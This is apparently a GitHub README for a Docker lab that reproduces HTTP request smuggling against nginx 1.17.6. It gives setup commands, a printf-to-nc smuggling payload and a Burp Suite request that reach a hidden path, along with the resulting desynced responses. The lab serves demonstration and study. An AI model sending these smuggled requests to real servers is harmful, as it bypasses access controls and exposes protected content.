#	HTTP REQUEST SMUGGLING ON NGINX

##	AFFECTED VERSION

Nginx 1.17.6

##	Usage

DEMONSTARTION PURPOSE.

###	HOW TO CONFIGURE 

```bash
$ git clone https://github.com/403accessdenied/HTTP-REQUEST-SMUGGLING
$ cd HTTP-REQUEST-SMUGGLING
$ docker-compose up -d
```


The nginx server will on the port 9095.



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 302 Moved Temporarily
```

1 HTTP code 302 means all right! 

Enjoy!



##	Reproduce

### open linux terminal and paste the below command

```bash
printf 'GET /a HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Content-Length: 56\r\n'\
'\r\n'\
'GET /sensitive/index.html HTTP/1.1\r\n'\
'Host: attackerhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9095
```

 ###  you will get two responses as following.

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive

successfully accessed my secret!
```
## Reproduce using **Burpsuite**

1. Open bursuite and  open firefox browser 
2. Open the url **127.0.0.1:9095** in the browser 
3. Intercept the request and send it to the repeater 
4. Now replace the intercepted request with the following request
 
```bash 
GET / HTTP/1.1
Host: 127.0.0.1:9095
Content-Length: 56

GET /_hidden/index.html HTTP/1.1
Host: attackerhost


```

![burp-request](https://user-images.githubusercontent.com/102154743/159486728-f7605d05-6724-4500-a091-fbe670f90402.png)

5. When you send the request we will get below response


![burp-response](https://user-images.githubusercontent.com/102154743/159486730-227653af-d594-450f-87a3-c6c0cda04c61.png)

6.Repeat the process untill we will get **Two response from server** as below


![burp-desync](https://user-images.githubusercontent.com/102154743/159486724-71df79ac-94ca-4ec8-a011-2e3967092bac.png)


#	Reference

https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf
